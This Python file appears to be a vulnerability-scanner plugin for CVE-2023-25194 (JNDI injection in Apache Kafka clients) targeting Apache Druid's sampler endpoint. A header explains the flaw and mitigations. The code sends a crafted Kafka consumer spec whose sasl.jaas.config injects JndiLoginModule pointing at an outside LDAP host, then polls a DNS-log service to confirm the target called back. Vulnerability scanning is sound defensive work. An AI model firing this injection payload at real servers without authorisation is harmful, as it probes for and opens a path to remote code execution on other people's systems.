"""
@Author: exiashow
@File: kafka_clients_jndi_injection.py
@Date: 2024/3/8 10:12
@Desc: CVE-2023-25194, Apache Kafka is an open-source distributed event streaming platform that is used for real-time data streaming and processing. Kafka clients are a set of Java libraries that allow you to produce and consume messages from Apache Kafka.
       In the version prior to 3.3.2, there is a JNDI injection issue in the Apache Kafka clients if an attacker is able to set the sasl.jaas.config property for any of the connector's Kafka clients to com.sun.security.auth.module.JndiLoginModule. It will allow the server to connect to the attacker's LDAP server and deserialize the LDAP response, which the attacker can use to execute java deserialization gadget chains on the Kafka connect server. Attacker can cause unrestricted deserialization of untrusted data (or) RCE vulnerability when there are gadgets in the classpath.
       Because this issue exists in a Java library, we have to find a real world software that is using the kafka-clients.
@Summary: Validating connector configurations to only allow trusted JNDI configurations
          Verifying any connector dependencies for vulnerable versions, updating connector dependencies, and removing vulnerable connectors
          Upgrading to version 3.4.0 and leveraging the org.apache.kafka.disallowed.login.modules system property to disallow the vulnerable login module.
"""

from config import API_TOKEN
import requests
import sys


def send_requests(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 ('
    }
    data = {
        "type": "kafka",
        "spec": {
            "type": "kafka",
            "ioConfig": {
                "type": "kafka",
                "consumerProperties": {
                    "bootstrap.servers": "127.0.0.1:6666",
                    "sasl.mechanism": "SCRAM-SHA-256",
                    "security.protocol": "SASL_SSL",
                    "sasl.jaas.config": "com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://h8ri9a.ceye.io\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"
                },
                "topic": "test",
                "useEarliestOffset": True,
                "inputFormat": {
                    "type": "regex",
                    "pattern": "([\\s\\S]*)",
                    "listDelimiter": "56616469-6de2-9da4-efb8-8f416e6e6965",
                    "columns": [
                        "raw"
                    ]
                }
            },
            "dataSchema": {
                "dataSource": "sample",
                "timestampSpec": {
                    "column": "!!!_no_such_column_!!!",
                    "missingValue": "1970-01-01T00:00:00Z"
                },
                "dimensionsSpec": {

                },
                "granularitySpec": {
                    "rollup": False
                }
            },
            "tuningConfig": {
                "type": "kafka"
            }
        },
        "samplerConfig": {
            "numRows": 500,
            "timeoutMs": 15000
        }
    }

    try:
        response = requests.post(url + ":8888/druid/indexer/v1/sampler?for=connect", headers=headers, json=data,
                                 verify=False)
        return response
    except requests.exceptions.ConnectionError:
        pass


def dns_check(token=API_TOKEN, record_type="dns"):
    """
    Check whether the record is successfully created as a basis for judgment
    :param token: ceye.io token
    :param record_type: dns
    :return: access to recodes
    """
    url = f"http://api.ceye.io/v1/records?token={token}&type={record_type}&filter="
    response = requests.get(url)
    return response


class KafkaClients:
    def __init__(self, url):
        self.url = url

    def run(self):
        req1 = send_requests(self.url)
        req2 = dns_check()
        try:
            if req1.status_code == 400 and "created_at" in req2.text:
                return "[Warning] Kafka vulnerability discovered: CVE-2023-25194"
            else:
                return None
        except requests.exceptions.ConnectionError:
            pass


if __name__ == '__main__':
    fallingSword = KafkaClients(sys.argv[1])
    fallingSword.run()
